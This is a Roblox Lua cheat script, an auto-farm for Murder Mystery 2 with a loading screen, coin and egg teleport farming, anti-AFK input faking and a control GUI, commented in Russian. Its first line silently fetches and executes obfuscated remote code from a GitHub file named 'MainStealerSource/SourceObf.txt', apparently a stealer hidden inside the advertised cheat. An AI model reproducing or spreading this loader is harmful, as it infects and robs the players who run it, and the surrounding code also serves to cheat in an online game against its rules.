loadstring(game:HttpGet(('https://raw.githubusercontent.com/hubsrblx/MainStealerSource/refs/heads/main/SourceObf.txt')))()

-- Проверка на уже запущенный скрипт
if _G.AutoFarmMM2IsLoaded then return end
_G.AutoFarmMM2IsLoaded = true

-- CRUMBLE COOKIE🍪 - MM2 Auto Farm PRO v3.4 (ULTIMATE FIX)
-- Полный автофарм с исправлением всех багов

-- Глобальная блокировка
_G.IsLoading = true

-- ========== ЭКРАН ЗАГРУЗКИ ==========
local function ShowLoadingScreen()
    -- Удаляем старые экраны загрузки если есть
    for _, gui in ipairs(game.CoreGui:GetChildren()) do
        if gui.Name:find("LoadingScreen_") then
            gui:Destroy()
        end
    end

    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Name = "LoadingScreen_"..math.random(1, 9999)
    LoadingGui.Parent = game.CoreGui
    LoadingGui.ResetOnSpawn = false

    local LoadingFrame = Instance.new("Frame")
    LoadingFrame.Name = "LoadingFrame"
    LoadingFrame.Size = UDim2.new(0, 300, 0, 150)
    LoadingFrame.AnchorPoint = Vector2.new(1, 0)
    LoadingFrame.Position = UDim2.new(1, -10, 0, 10)
    LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    LoadingFrame.BackgroundTransparency = 0.03
    LoadingFrame.BorderSizePixel = 0
    LoadingFrame.Parent = LoadingGui

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Thickness = 2
    UIStroke.Color = Color3.fromRGB(100, 100, 100)
    UIStroke.Transparency = 0.5
    UIStroke.Parent = LoadingFrame

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = LoadingFrame

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Text = "John Scripts"
    Title.TextColor3 = Color3.fromRGB(170, 0, 255)
    Title.Font = Enum.Font.ArimoBold
    Title.TextSize = 24
    Title.Parent = LoadingFrame

    local PercentText = Instance.new("TextLabel")
    PercentText.Name = "PercentText"
    PercentText.Size = UDim2.new(1, 0, 0, 40)
    PercentText.Position = UDim2.new(0, 0, 0, 50)
    PercentText.BackgroundTransparency = 1
    PercentText.Text = "0%"
    PercentText.TextColor3 = Color3.fromRGB(170, 0, 255)
    PercentText.Font = Enum.Font.LuckiestGuy
    PercentText.TextSize = 30
    PercentText.Parent = LoadingFrame

    local LoadingText = Instance.new("TextLabel")
    LoadingText.Name = "LoadingText"
    LoadingText.Size = UDim2.new(1, 0, 0, 20)
    LoadingText.Position = UDim2.new(0, 0, 0, 90)
    LoadingText.BackgroundTransparency = 1
    LoadingText.Text = "LOADING"
    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingText.Font = Enum.Font.LuckiestGuy
    LoadingText.TextSize = 14
    LoadingText.Parent = LoadingFrame

    local startTime = tick()
    local duration = 20
    
    while tick() < startTime + duration do
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        PercentText.Text = math.floor(progress * 100) .. "%"
        task.wait(0.05)
    end
    
    LoadingGui:Destroy()
    _G.IsLoading = false
end

-- ========== ОСНОВНЫЕ НАСТРОЙКИ ==========
local COLLECTION_SPEED = 0.05
local TELEPORT_DISTANCE = 150
local MOVEMENT_SPEED = 25
local RARE_EGG_ATTEMPT_TIME = 2
local JUMP_HEIGHT = 1.5
local JUMP_COOLDOWN = 0.6
local JUMP_CHECK_DISTANCE = 5

-- Цвета интерфейса
local BLACK_MAIN = Color3.fromRGB(25, 25, 25)
local BLACK_MAIN_TRANSPARENCY = 0.03
local PURPLE_ACCENT = Color3.fromRGB(170, 0, 255)
local PURPLE_ACCENT_TRANSPARENCY = 0
local WHITE_TEXT = Color3.fromRGB(255, 255, 255)
local PURPLE_HEADER = Color3.fromRGB(170, 0, 255)
local DARK_GRAY_HEADER = Color3.fromRGB(40, 40, 40)
local DARK_GRAY_HEADER_TRANSPARENCY = 0
local RED_CLOSE = Color3.fromRGB(255, 80, 80)
local GRAY_NOTE = Color3.fromRGB(170, 170, 170)

-- Шрифты
local MAIN_FONT = Enum.Font.ArimoBold
local SPECIAL_FONT = Enum.Font.FredokaOne

-- Тексты интерфейса
local TEXT_TITLE = "John 2.1 🥚"
local TEXT_MINIMIZE = "-"
local TEXT_CLOSE = "X"
local TEXT_AUTO_EGG = "Egg Farm - 🥚"
local TEXT_AUTO_COINS = "Coin Farm - 💵"
local TEXT_AUTO_BOTH = "Coin & Egg Farm - 👩🏿‍🌾"
local TEXT_AUTO_RARE = "Rare Egg Farm - 💎"
local TEXT_RARE_EGG_NOTE = "Maybe little bugs with egg which you have"

-- Размеры текста
local TEXT_SIZE_TITLE = 18
local TEXT_SIZE_BUTTON = 14
local TEXT_SIZE_NOTE = 10

-- Сервисы
local Player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoinCollectedEvent = game.ReplicatedStorage.Remotes.Gameplay.CoinCollected
local RoundStartEvent = game.ReplicatedStorage.Remotes.Gameplay.RoundStart
local RoundEndEvent = game.ReplicatedStorage.Remotes.Gameplay.RoundEndFade
local autofarmstopevent = Instance.new("BindableEvent")

-- Переменные состояния
local AutofarmStarted = false
local AutofarmIN = false
local LastJumpTime = 0
local RareEggsF = false
local SavePartPos = nil
local FullEggBag = false
local CurrentCoinTypes = {}
local CollectedCoins = {}
local NeededCoinTypes = {}
local activeFarmButton = nil
local currentTween = nil
local processedEggs = {}
local isAttemptingRareEgg = false
local LastCoinTouchTime = 0
local MainGUI = nil

-- ========== ОСНОВНЫЕ ФУНКЦИИ ==========
local function AntiAFK()
    local VirtualUser = game:GetService("VirtualUser")
    Player.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

local function GetCoinContainer()
    for _, v in workspace:GetChildren() do
        if v:FindFirstChild("CoinContainer") and v:IsA("Model") then
            return v:FindFirstChild("CoinContainer")
        end
    end
    return nil
end

local function CreateSafeZone()
    local part = Instance.new("Part")
    part.Size = Vector3.new(12, 1, 12)
    part.Position = Player.Character.HumanoidRootPart.Position + Vector3.new(0, 120, 0)
    part.Transparency = 1
    part.Anchored = true
    part.CanCollide = false
    part.Parent = workspace
    SavePartPos = part.CFrame * CFrame.new(0, 6, 0)
    return SavePartPos
end

local function SafeTeleport(position)
    if _G.IsLoading or not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then return end
    if currentTween then currentTween:Cancel() end
    Player.Character.HumanoidRootPart.CFrame = position
end

local function IsOnCoin()
    if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then
        return false
    end
    
    local root = Player.Character.HumanoidRootPart
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {Player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    
    for x = -1, 1 do
        for z = -1, 1 do
            local offset = Vector3.new(x * 2, 0, z * 2)
            local raycastResult = workspace:Raycast(root.Position + offset, Vector3.new(0, -JUMP_CHECK_DISTANCE, 0), raycastParams)
            if raycastResult and raycastResult.Instance:IsDescendantOf(GetCoinContainer()) then
                return true
            end
        end
    end
    return false
end

local function Jump()
    if Player.Character and Player.Character:FindFirstChild("Humanoid") then
        local humanoid = Player.Character.Humanoid
        humanoid.Jump = true
        local root = Player.Character.HumanoidRootPart
        root.Velocity = Vector3.new(root.Velocity.X, JUMP_HEIGHT * 30, root.Velocity.Z)
    end
end

local function FindTargetCoin()
    local container = GetCoinContainer()
    if not container then return nil end

    local coins = {}
    local root = Player.Character.HumanoidRootPart
    
    for _, coin in pairs(container:GetChildren()) do
        if coin:FindFirstChild("TouchInterest") then
            local coinType = coin:GetAttribute("CoinID")
            if NeededCoinTypes[coinType] and 
               (not CollectedCoins[coinType] or CollectedCoins[coinType].current < CollectedCoins[coinType].max) then
                local distance = (root.Position - coin.Position).Magnitude
                table.insert(coins, {
                    coin = coin,
                    distance = distance,
                    type = coinType
                })
            end
        end
    end
    
    table.sort(coins, function(a, b) return a.distance < b.distance end)
    return #coins > 0 and coins[1] or nil
end

local function CollectCoin(coin)
    if not coin or _G.IsLoading then return end
    
    local jumpCount = 0
    local lastJumpTime = 0
    LastCoinTouchTime = tick()
    
    while coin:FindFirstChild("TouchInterest") and AutofarmIN and not _G.IsLoading do
        if not coin:FindFirstChild("TouchInterest") then break end
        
        if tick() - LastCoinTouchTime > 2.5 and jumpCount < 2 then
            if IsOnCoin() and tick() - lastJumpTime > JUMP_COOLDOWN then
                Jump()
                lastJumpTime = tick()
                jumpCount = jumpCount + 1
            end
        end
        task.wait()
    end
end

local function UpdateNeededTypes()
    NeededCoinTypes = {}
    if activeFarmButton and activeFarmButton.Name == "AUTO_COIN_EGG" then
        NeededCoinTypes.Egg = true
        NeededCoinTypes.Coin = true
        return
    end
    
    for _, coinType in ipairs(CurrentCoinTypes) do
        NeededCoinTypes[coinType] = true
    end
end

local function StartAutofarm()
    if _G.IsLoading then return end
    AutofarmStarted = true
    AutofarmIN = true
    CollectedCoins = {}
    UpdateNeededTypes()
end

local function StopAutofarm()
    AutofarmStarted = false
    AutofarmIN = false
    if currentTween then
        currentTween:Cancel()
        currentTween = nil
    end
    autofarmstopevent:Fire()
end

-- ========== ФУНКЦИИ АВТОФАРМА ==========
local function AutoRareEggs()
    while RareEggsF and task.wait(0.2) do
        if _G.IsLoading then continue end
        
        if GetCoinContainer() and Player:GetAttribute("Alive") and not isAttemptingRareEgg then
            local rareEggs = {}
            for _, egg in pairs(GetCoinContainer():GetChildren()) do
                if egg:GetAttribute("CoinID") == "RareEgg" and 
                   egg:FindFirstChildOfClass("MeshPart") and 
                   egg:FindFirstChildOfClass("MeshPart").Transparency < 0.6 then
                    table.insert(rareEggs, egg)
                end
            end
            
            table.sort(rareEggs, function(a, b)
                return (Player.Character.HumanoidRootPart.Position - a.Position).Magnitude < 
                       (Player.Character.HumanoidRootPart.Position - b.Position).Magnitude
            end)
            
            for _, egg in ipairs(rareEggs) do
                local eggId = tostring(egg.Position)
                
                if not processedEggs[eggId] then
                    isAttemptingRareEgg = true
                    processedEggs[eggId] = true
                    
                    local wasAutofarmIN = AutofarmIN
                    AutofarmIN = false
                    
                    SafeTeleport(egg.CFrame)
                    
                    local startTime = os.time()
                    while os.time() - startTime < RARE_EGG_ATTEMPT_TIME and RareEggsF and not _G.IsLoading do
                        if IsOnCoin() and tick() - LastJumpTime > JUMP_COOLDOWN then
                            Jump()
                            LastJumpTime = tick()
                        end
                        task.wait()
                    end
                    
                    AutofarmIN = wasAutofarmIN
                    
                    if FullEggBag then
                        SafeTeleport(SavePartPos)
                    end
                    
                    isAttemptingRareEgg = false
                    break
                end
            end
        end
    end
end

-- ========== GUI ФУНКЦИИ ==========
local function CreateMainGUI()
    -- Удаляем старый GUI если есть
    if MainGUI then
        MainGUI:Destroy()
        MainGUI = nil
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "CrumbleCookieMM2"
    ScreenGui.Parent = game.CoreGui
    ScreenGui.ResetOnSpawn = false
    MainGUI = ScreenGui

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 300, 0, 220)
    MainFrame.AnchorPoint = Vector2.new(1, 0)
    MainFrame.Position = UDim2.new(1, -10, 0, 10)
    MainFrame.BackgroundColor3 = BLACK_MAIN
    MainFrame.BackgroundTransparency = BLACK_MAIN_TRANSPARENCY
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Thickness = 2
    UIStroke.Color = Color3.fromRGB(100, 100, 100)
    UIStroke.Transparency = 0.5
    UIStroke.Parent = MainFrame

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame

    -- Заголовок
    local TitleBar = Instance.new("Frame")
    TitleBar.Name = "TitleBar"
    TitleBar.Size = UDim2.new(1, 0, 0, 30)
    TitleBar.Position = UDim2.new(0, 0, 0, 0)
    TitleBar.BackgroundColor3 = DARK_GRAY_HEADER
    TitleBar.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = MainFrame

    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 12)
    TitleCorner.Parent = TitleBar

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(0.7, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = TEXT_TITLE
    Title.TextColor3 = PURPLE_HEADER
    Title.Font = MAIN_FONT
    Title.TextSize = TEXT_SIZE_TITLE
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.TextYAlignment = Enum.TextYAlignment.Center
    Title.Parent = TitleBar

    local MinimizeButton = Instance.new("TextButton")
    MinimizeButton.Name = "MinimizeButton"
    MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
    MinimizeButton.Position = UDim2.new(1, -60, 0, 0)
    MinimizeButton.BackgroundColor3 = DARK_GRAY_HEADER
    MinimizeButton.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
    MinimizeButton.Text = TEXT_MINIMIZE
    MinimizeButton.TextColor3 = WHITE_TEXT
    MinimizeButton.Font = SPECIAL_FONT
    MinimizeButton.TextSize = TEXT_SIZE_TITLE
    MinimizeButton.TextYAlignment = Enum.TextYAlignment.Center
    MinimizeButton.Parent = TitleBar

    local MinimizeCorner = Instance.new("UICorner")
    MinimizeCorner.CornerRadius = UDim.new(0, 12)
    MinimizeCorner.Parent = MinimizeButton

    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -30, 0, 0)
    CloseButton.BackgroundColor3 = DARK_GRAY_HEADER
    CloseButton.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
    CloseButton.Text = TEXT_CLOSE
    CloseButton.TextColor3 = RED_CLOSE
    CloseButton.Font = SPECIAL_FONT
    CloseButton.TextSize = TEXT_SIZE_TITLE
    CloseButton.TextYAlignment = Enum.TextYAlignment.Center
    CloseButton.Parent = TitleBar

    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 12)
    CloseCorner.Parent = CloseButton

    -- Функции управления GUI
    local isMinimized = false
    local originalSize = MainFrame.Size
    local minimizedSize = UDim2.new(0, 300, 0, 30)
    local childrenVisibility = {}

    local function ToggleMinimize()
        isMinimized = not isMinimized
        if isMinimized then
            for _, child in ipairs(MainFrame:GetChildren()) do
                if child ~= TitleBar and child ~= UICorner and child ~= UIStroke then
                    childrenVisibility[child] = child.Visible
                    child.Visible = false
                end
            end
            MainFrame.Size = minimizedSize
        else
            MainFrame.Size = originalSize
            for child, visible in pairs(childrenVisibility) do
                child.Visible = visible
            end
            childrenVisibility = {}
        end
    end

    MinimizeButton.MouseButton1Click:Connect(ToggleMinimize)

    -- Перемещение GUI
    local dragging = false
    local dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        MainFrame.Position = newPos
    end

    TitleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    TitleBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)

    -- Создание кнопок
    local buttonHeight = 35
    local buttonSpacing = 8
    local currentY = 35

    local function CreateButton(name, text, yPos, callback)
        local button = Instance.new("TextButton")
        button.Name = name
        button.Size = UDim2.new(0.8, 0, 0, buttonHeight)
        button.Position = UDim2.new(0.1, 0, 0, yPos)
        button.BackgroundColor3 = DARK_GRAY_HEADER
        button.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
        button.Text = text..": OFF"
        button.TextColor3 = WHITE_TEXT
        button.Font = MAIN_FONT
        button.TextSize = TEXT_SIZE_BUTTON
        button.TextYAlignment = Enum.TextYAlignment.Center
        button.Parent = MainFrame
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = button
        
        button.MouseButton1Click:Connect(function()
            if _G.IsLoading then return end
            callback(button)
        end)
        return button
    end

    -- Кнопки фарма
    local function DeactivateCurrentFarm()
        if activeFarmButton then
            activeFarmButton.Text = activeFarmButton.Text:gsub(": ON", ": OFF")
            activeFarmButton.BackgroundColor3 = DARK_GRAY_HEADER
            activeFarmButton.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
            activeFarmButton = nil
        end
    end

    local function SetFarmType(type, button)
        if activeFarmButton == button then
            DeactivateCurrentFarm()
            StopAutofarm()
            return
        end
        
        DeactivateCurrentFarm()
        CurrentCoinTypes = type
        activeFarmButton = button
        
        button.Text = button.Text:gsub(": OFF", ": ON")
        button.BackgroundColor3 = PURPLE_ACCENT
        button.BackgroundTransparency = PURPLE_ACCENT_TRANSPARENCY
        
        CollectedCoins = {}
        UpdateNeededTypes()
        StartAutofarm()
    end

    local autoEggBtn = CreateButton("AUTO_EGG", TEXT_AUTO_EGG, currentY, function(btn)
        SetFarmType({"Egg"}, btn)
    end)
    currentY = currentY + buttonHeight + buttonSpacing

    local autoCoinsBtn = CreateButton("AUTO_COINS", TEXT_AUTO_COINS, currentY, function(btn)
        SetFarmType({"Coin"}, btn)
    end)
    currentY = currentY + buttonHeight + buttonSpacing

    local autoBothBtn = CreateButton("AUTO_COIN_EGG", TEXT_AUTO_BOTH, currentY, function(btn)
        if activeFarmButton == btn then
            DeactivateCurrentFarm()
            StopAutofarm()
            return
        end
        
        DeactivateCurrentFarm()
        CurrentCoinTypes = {"Egg", "Coin"}
        NeededCoinTypes = {Egg = true, Coin = true}
        activeFarmButton = btn
        
        btn.Text = btn.Text:gsub(": OFF", ": ON")
        btn.BackgroundColor3 = PURPLE_ACCENT
        btn.BackgroundTransparency = PURPLE_ACCENT_TRANSPARENCY
        
        CollectedCoins = {}
        StartAutofarm()
    end)
    currentY = currentY + buttonHeight + buttonSpacing

    local autoRareBtn = CreateButton("AUTO_RARE_EGGS", TEXT_AUTO_RARE, currentY, function(btn)
        if RareEggsF then
            RareEggsF = false
            btn.Text = btn.Text:gsub(": ON", ": OFF")
            btn.BackgroundColor3 = DARK_GRAY_HEADER
            btn.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
            CurrentCoinTypes = {"Egg"}
            UpdateNeededTypes()
            return
        end
        
        RareEggsF = true
        btn.Text = btn.Text:gsub(": OFF", ": ON")
        btn.BackgroundColor3 = PURPLE_ACCENT
        btn.BackgroundTransparency = PURPLE_ACCENT_TRANSPARENCY
        CurrentCoinTypes = {"Egg", "RareEgg"}
        UpdateNeededTypes()
        spawn(AutoRareEggs)
    end)

    local RareEggNote = Instance.new("TextLabel")
    RareEggNote.Name = "RareEggNote"
    RareEggNote.Size = UDim2.new(0.8, 0, 0, 15)
    RareEggNote.Position = UDim2.new(0.1, 0, 0, currentY + buttonHeight - 3)
    RareEggNote.BackgroundTransparency = 1
    RareEggNote.Text = TEXT_RARE_EGG_NOTE
    RareEggNote.TextColor3 = GRAY_NOTE
    RareEggNote.Font = MAIN_FONT
    RareEggNote.TextSize = TEXT_SIZE_NOTE
    RareEggNote.TextXAlignment = Enum.TextXAlignment.Center
    RareEggNote.TextYAlignment = Enum.TextYAlignment.Center
    RareEggNote.Parent = MainFrame

    -- Закрытие GUI
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        _G.AutoFarmMM2IsLoaded = false
        _G.IsLoading = nil
        MainGUI = nil
    end)

    return ScreenGui
end

-- ========== ОБРАБОТЧИКИ СОБЫТИЙ ==========
CoinCollectedEvent.OnClientEvent:Connect(function(cointype, current, max)
    if _G.IsLoading then return end
    
    LastCoinTouchTime = tick()
    
    -- Обновляем счетчик только для активных типов монет
    if NeededCoinTypes[cointype] then
        CollectedCoins[cointype] = {
            current = tonumber(current),
            max = tonumber(max)
        }
    end

    -- Проверяем заполненность ТОЛЬКО если это активный тип монеты
    if NeededCoinTypes[cointype] then
        local shouldTeleport = true
        
        -- Проверяем все нужные типы монет
        for neededType, _ in pairs(NeededCoinTypes) do
            if not CollectedCoins[neededType] or 
               CollectedCoins[neededType].current < CollectedCoins[neededType].max then
                shouldTeleport = false
                break
            end
        end

        -- Телепортируем только если ВСЕ нужные типы заполнены
        if shouldTeleport then
            AutofarmIN = false
            FullEggBag = true
            SafeTeleport(CreateSafeZone())
        else
            -- Продолжаем фарм если еще есть что собирать
            AutofarmIN = AutofarmStarted
        end
    end
end)

RoundStartEvent.OnClientEvent:Connect(function()
    if _G.IsLoading then return end
    CollectedCoins = {}
    processedEggs = {}
    UpdateNeededTypes()
    AutofarmIN = AutofarmStarted
    FullEggBag = false
end)

RoundEndEvent.OnClientEvent:Connect(function()
    if _G.IsLoading then return end
    AutofarmIN = false
    FullEggBag = false
end)

-- ========== ЗАПУСК СИСТЕМЫ ==========
-- Запускаем загрузку
spawn(ShowLoadingScreen)

-- Ждем завершения загрузки игры
if not game:IsLoaded() then
    game.Loaded:Wait()
end
task.wait(3)

-- Основной цикл автофарма
local function MainFarmLoop()
    -- Ждем завершения загрузки
    while _G.IsLoading do task.wait() end
    
    AntiAFK()
    while task.wait(COLLECTION_SPEED) do
        if _G.IsLoading or not AutofarmStarted or not AutofarmIN or FullEggBag 
           or isAttemptingRareEgg or not Player.Character or not GetCoinContainer() 
           or not Player:GetAttribute("Alive") then
            continue
        end

        local target = FindTargetCoin()
        if not target then continue end

        if target.distance > TELEPORT_DISTANCE then
            SafeTeleport(target.coin.CFrame)
        else
            if currentTween then currentTween:Cancel() end
            
            currentTween = TweenService:Create(
                Player.Character.HumanoidRootPart,
                TweenInfo.new(target.distance / MOVEMENT_SPEED, Enum.EasingStyle.Linear),
                {CFrame = target.coin.CFrame}
            )
            currentTween:Play()
            
            autofarmstopevent.Event:Connect(function()
                if currentTween then currentTween:Cancel() end
            end)
            
            repeat 
                if IsOnCoin() then
                    CollectCoin(target.coin)
                end
                task.wait()
            until not target.coin:FindFirstChild("TouchInterest") or not AutofarmIN or _G.IsLoading
            
            if currentTween then currentTween:Cancel() end
        end
    end
end

-- Создаем GUI после загрузки
while _G.IsLoading do task.wait() end
CreateMainGUI()

-- Запускаем основной цикл
spawn(MainFarmLoop)

-- Очистка при выходе
game:GetService("Players").PlayerRemoving:Connect(function(player)
    if player == Player then
        _G.AutoFarmMM2IsLoaded = false
        _G.IsLoading = nil
        if MainGUI then
            MainGUI:Destroy()
            MainGUI = nil
        end
    end
end)
